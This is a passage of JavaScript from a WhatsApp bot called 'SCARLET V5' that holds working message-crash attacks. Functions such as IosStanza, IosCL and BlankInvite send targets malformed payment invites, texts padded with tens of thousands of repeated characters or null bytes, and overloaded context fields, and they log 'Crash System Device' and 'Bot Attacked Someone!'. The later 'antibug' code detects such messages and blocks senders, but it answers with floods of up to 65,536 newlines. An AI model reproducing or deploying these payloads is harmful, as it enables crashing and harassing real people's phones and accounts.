     groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: xcl }]
     }
  }
}
}), { userJid: zLoc, quoted: m })
await bad.relayMessage(zLoc, etc.message, { participant: { jid: zLoc }, messageId: etc.key.id })
console.log(chalk.red.bold('Crash System Device By 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈'))
}

// Ios Speciality //
	async function IosPayM(zLoc, ptcp = false) {
			bad.relayMessage(zLoc, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': zLoc
				}
			});
			console.log(chalk.green("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈 Bot | Bug Sent "));
		};
		
				async function IosStanza(zLoc, ptcp = false) {
			bad.relayMessage(zLoc, {
				'extendedTextMessage': {
					'text': '𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈Bugs' + 'ꦾ'.repeat(35000),
					'contextInfo': {
						'stanzaId': zLoc,
						'participant': zLoc,
						'quotedMessage': {
							'conversation': '🌷 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈 Here' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': zLoc
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("Attacking | Bug Sent 😈"));
		};
		
				async function IosCL(zLoc, ptcp = false) {
			await bad.relayMessage(zLoc, {
					"extendedTextMessage": {
						"text": " Hello This Is 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈 ",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "0@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "0@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": zLoc,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6281991410940@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "Hello ",
								"body": " 🌷 𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈 Is Here ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": " p ",
								"mediaUrl": " p ",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": " p "
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc,
					}
				} : {}
			);
			console.log(chalk.green("𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈 Bot Attacked Someone!"));
		};
		
// Blank Speciality //
async function BlankInvite(LockJids, ptcp = false) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "z𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5⃟⃟⃟😈" + "\u0000".repeat(50000),
							"jpegThumbnail": "",
							"caption": 'ꦾ'.repeat(30000),
							"inviteExpiration": Date.now() + 1600
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await bad.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}
			
let example = (teks) => {
return `\n*Example Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
async function loading () {
var baralod = [
"*𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5_*",
"*_𝑩Y 𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈><_*",
"*_PLEASE WAIT●_*", 
"*_LOADING COMPLETED_*",
"*_SUCESS FULL_*", 
]
let { key } = await bad.sendMessage(from, {text: '𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝐕5'})

for (let i = 0; i < baralod.length; i++) {
await bad.sendMessage(from, {text: baralod[i], edit: key });
}
}                                       
if (m.message) {
                                     if (m.mtype === "documentMessage") {
                                       newly = "\n".repeat(0x3e8);
                                       await bad.sendMessage(m.chat, {
                                         'text': newly
                                       });
                                       await bad.sendMessage(bad.user.id, {
                                         'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░░░▓█"
                                       });
                                       await bad.updateBlockStatus(m.sender, "block");
                                     }
                                   }
                                   if (m.message) {
                                                                        if (m.mtype === "locationMessage") {
                                                                          newly = "\n".repeat(0x3e8);
                                                                          await bad.sendMessage(m.chat, {
                                                                            'text': newly
                                                                          });
                                                                          await bad.sendMessage(bad.user.id, {
                                                                            'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░░░▓█"
                                                                          });
                                                                          await bad.updateBlockStatus(m.sender, "block");
                                                                        }
                                                                      }
                                   
                                   if (m.message) {
                                            if (m.mtype === "viewOnceMessage") {
                                              newly = "\n".repeat(0x3e8);
                                              await bad.sendMessage(m.chat, {
                                                'text': newly
                                              });
                                              await bad.sendMessage(bad.user.id, {
                                                'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░░░▓█"
                                              });
                                              await bad.updateBlockStatus(m.sender, "block");
                                            }
                                          }
if (isGroup && m.sender !== ((bad.user.id))) {
                                        
                                                      if (m.mtype === 'locationMessage') {
                                                        console.log(color('[KICK]', 'red'), color('Received location bug!', 'yellow'));
                                                        await bad.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: (bad.user.id), participant: m.key.participant }});
                                                        await bad.groupParticipantsUpdate(from, [sender], 'remove');
                                                        bad.sendMessage(`${ownernumber}@s.whatsapp.net`, { text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Location Bug ${isGroup ? `in ${groupName}` : ''}`});
                                                        reply('*LOCATION BUG DETECTED* he or she is bugging the group');
                                                      }
                                                    
                                                      else if (m.mtype === 'documentMessage') {
                                                        console.log(color('[KICK]', 'red'), color('Received document bug!', 'yellow'));
                                                        await bad.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: (bad.user.id), participant: m.key.participant }});
                                                        await bad.groupParticipantsUpdate(from, [sender], 'remove');
                                                        bad.sendMessage(`${ownernumber}@s.whatsapp.net`, { text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Document Bug ${isGroup ? `in ${groupName}` : ''}`});
                                                        reply('*DOCUMENT BUG DETECTED* he or she is bugging the group');
                                                      }
                                                    
                                                      else if (m.mtype === 'textMessage' && m.text.includes('crash')) {
                                                        console.log(color('[KICK]', 'red'), color('Received crash bug!', 'yellow'));
                                                        await bad.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: (bad.user.id), participant: m.key.participant }});
                                                        await bad.groupParticipantsUpdate(from, [sender], 'remove');
                                                        bad.sendMessage(`${ownernumber}@s.whatsapp.net`, { text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Crash Bug ${isGroup ? `in ${groupName}` : ''}`});
                                                        reply('*CRASH BUG DETECTED* he or she is bugging the group');
                                                      }
                                                    
                                                      else if (m.mtype === 'textMessage' && m.text.includes('Xfreeze')) {
                                                        console.log(color('[KICK]', 'red'), color('Received Xfreeze bug!', 'yellow'));
                                                        await bad.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: (bad.user.id), participant: m.key.participant }});
                                                        await bad.groupParticipantsUpdate(from, [sender], 'remove');
                                                        bad.sendMessage(`${ownernumber}@s.whatsapp.net`, { text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Xfreeze Bug ${isGroup ? `in ${groupName}` : ''}`});
                                                        reply('*XFREEZE BUG DETECTED* he or she is bugging the group');
                                                      }
                                                    
                                                      else if (budy.length > 1500) {
                                                        console.log(color('[KICK]', 'red'), color('Received virus text!', 'yellow'));
                                                        bad.sendText(m.chat, `*MARK AS READ*\n... *Virus sender here:* \nwa.me/${sender.split("@")[0]}`);
                                                            await bad.groupParticipantsUpdate(from, [sender], 'remove');
                                                        await bad.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: (bad.user.id), participant: m.key.participant }});
                                                        bad.sendMessage(`${ownernumber}@s.whatsapp.net`, { text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virus ${isGroup ? `in ${groupName}` : ''}`});
                                                        reply('*VIRUS DETECTED* he or she is bugging the group');
                                                      }
                                                    }
if (m.message) {
                     if (m.mtype === "buttonsResponseMessage") {
                       newly = "\n".repeat(65536);
                       await bad.sendMessage(m.chat, {
                         'text': newly
                       });
                       await bad.sendMessage(bad.user.id, {
                         'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                       });
                       await bad.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
                                                            await bad.updateBlockStatus(sender, "block");
                     }
                   }


                   if (m.message) {
                                                                                                  if (m.mtype === "paymentInviteMessage") {
                                                                                                    newly = "\n".repeat(65536);
                                                                                                    await bad.sendMessage(m.chat, {
                                                                                                      'text': newly
                                                                                                    });
                                                                                                    await bad.sendMessage(bad.user.id, {
                                                                                                      'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                    });
                                                                                                    await bad.updateBlockStatus(m.sender, "block");
                                                                                                  }
                                                                                                }
                              
                                    
if (m.message && !m.isGroup) {
                                                                                     if (budy.length > 500 && m.sender !== (bad.user.id)) {
                                                                                     if (isOwner) return;
                                              await bad.sendMessage(from, {
                                                    delete: {
                                                      remoteJid: m.chat,
                                                      fromMe: false,
                                                      id: (bad.user.id),
                                                      participant: m.key.participant
                                                    }
                                                  });
                                                  
                                                  console.log(color('[VIRUS]', 'red'), color('Received a virus text!', 'yellow'));
                                                  
                       await bad.sendMessage((bad.user.id), {
                             text: m.sender.split('@')[0x0] + " detected sending bugs in PM. Blocked!"
                           });
                                                                                     bad.sendText(m.chat, `*VIRUS DECTECTED*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)
                        
                       await bad.updateBlockStatus(m.sender, "block");
                                                                                  await bad.sendMessage(bad.user.id, {
                                                                                   'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                 });
                                                        }
                                                                             }
                                 if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {
                
                                         if (budy.match(`🤡҈҈҈᜴࿆͆᷍D҈҈҈i҈҈҈t҈҈҈z҈҈҈z҈҈҈X҈҈҈҈-W҈h҈a҈t҈s҈A҈p҈p҈╮⭑ ☠️⃰͜͡؜D҈i҈҈t҈z҈z҈҈҈Z҈X҈҈҈⭐️᜴▴W҈h҈a҈t҈s҈A҈p҈p҈ཀ͜͡҈҈҈🤡҈҈҈⃟╮`)) {
                      console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                            await bad.sendMessage(m.chat, {
                                              'text': newly
                                            });
                                            await bad.sendMessage(bad.user.id, {
                                              'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                            });
                                
                      await bad.chatModify(
                                      { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                      m.key.remoteJid
                                  );
                                                           await bad.updateBlockStatus(sender, "block");
                                          }
                                        }
                                         if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {
                                                        
                    if (budy.match(`SÃŒ¸YÃª™°ÃŒ¸SÃª™°ÃŒ¸TÃª™°ÃŒ¸EÃª™°ÃŒ¸MÃª™°ÃŒ¸ UÃŒ¸IÃŒ¸ CÃŒ¸RÃª™°ÃŒ¸AÃª™°ÃŒ¸SÃª™°ÃŒ¸HÃª™°ÃŒ`)) {
                     console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                                                            newly = "\n".repeat(65536);
                                                                                    await bad.sendMessage(m.chat, {
                                                                                      'text': newly
                                                                                    });
                                                                                    await bad.sendMessage(bad.user.id, {
                                                                                      'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                    });
                                                                        await bad.chatModify(
                                                                                        { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                        m.key.remoteJid
                                                                                    );
                                                                                                   await bad.updateBlockStatus(sender, "block");
                                                                                  }
                                                                                }
                                    
                                                                             if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                     if (budy.match(`Ã Âº®Ã¢‚®Ã ½Å¾Ã ¸¨VÃª™°Ã ¸¨ Ã ¹–Ã Âº¡GÃª™°Ã ½€Ã¡ÃÅ“Ã¢Å“…Ã¢Æ’Å¸Ã¢•®`)) {
                                                                                                  console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                        await bad.sendMessage(m.chat, {
                                                                                                                          'text': newly
                                                                                                                        });
                                                                                                                        await bad.sendMessage(bad.user.id, {
